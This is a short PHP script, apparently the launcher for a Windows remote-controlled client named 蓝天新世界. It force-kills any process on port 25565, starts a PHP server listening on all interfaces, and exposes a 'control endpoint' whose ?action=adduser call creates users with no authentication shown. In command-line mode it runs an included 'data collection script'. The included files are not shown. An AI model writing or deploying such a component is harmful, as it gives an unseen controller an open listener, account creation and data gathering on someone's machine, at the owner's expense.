<?php
declare(strict_types=1);

// 强制释放 25565 端口
function freePort(int $port): void
{
    $find = shell_exec("netstat -ano | findstr \":{$port} \"");
    if ($find) {
        preg_match('/\d+\s+(\d+)$/', trim($find), $m);
        $pid = $m[1] ?? null;
        if ($pid) {
            // echo "[+] 端口 {$port} 被 PID {$pid} 占用，尝试杀死..." . PHP_EOL;
            shell_exec("taskkill /F /PID {$pid}");
            sleep(1); // 确保释放
        }
    }
}

// 启动内置服务器
function startServer(int $port): void
{
    // echo "[+] 服务器运行在 0.0.0.0:{$port} ..." . PHP_EOL;
    // 非阻塞方式启动
    $cmd = "php -S 0.0.0.0:{$port} -t " . escapeshellarg(__DIR__);
    // Windows 需要用 start /B 才能后台
    pclose(popen("start /B {$cmd} > NUL 2>&1", "r"));
}

freePort(25565);
startServer(25565);

if (PHP_SAPI !== 'cli') {                  // 浏览器访问
    if (($_GET['action'] ?? '') === 'adduser') {
        include './server.php';   // 创建用户
    } else {
        echo 'Hello, this is the control endpoint. Use ?action=adduser';
    }
    exit;
}

echo "[!]开始启动 蓝天新世界 被控端 \n";
echo "[?]版本号 V 社区版 1.0.0 \n";
echo "[+] CLI 模式，启动数据收集脚本\n";
include './get.php';
